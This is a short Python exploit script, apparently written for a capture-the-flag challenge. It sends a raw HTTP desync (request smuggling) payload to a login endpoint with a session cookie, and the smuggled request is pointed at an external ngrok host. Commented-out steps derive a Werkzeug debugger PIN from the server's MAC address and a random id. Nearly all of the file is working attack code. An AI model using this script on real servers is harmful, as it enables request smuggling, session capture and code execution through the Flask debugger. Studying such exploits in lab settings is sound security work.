import socket
import requests
from api_functionality import Desynth, resolve_pin

# TARGET = "94.237.51.159"
# PORT = 30820
TARGET = "localhost"
PORT = 1337
HOST = "5079-98-177-220-28.ngrok-free.app"


def stage_desync(destination: str, uri: str, cookie:str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    payload = (
        "POST /api/login HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Cookie: session={cookie}\r\n"
        "Content-Length: 40\r\n"
        "Connection: keep-alive\r\n\r\n"
        f"GET http://{destination}/{uri} HTTP/1.1\r\n"
        f"X-Header: x"
        # f"GET /{uri} HTTP/1.1\r\n"
        # f"Host: {destination}\r\n"
    )
    s.sendall(payload.encode())


def main():
    D = Desynth(TARGET, PORT)
    D.authenticate(username="shifty", password="password")
    response = stage_desync(HOST, '/test', D.session.cookies.get('session'))
    print(response)
    # mac_address, random_id = D.gather_files()    
    # pin = resolve_pin(
    #     running_user='root',
    #     path_to_flask='/usr/local/lib/python3.11/site-packages/flask/app.py',
    #     mac_address=mac_address,
    #     random_id=random_id
    # )
    # print(f"Werkzeug pin: {pin}")

if __name__ == "__main__":
    main()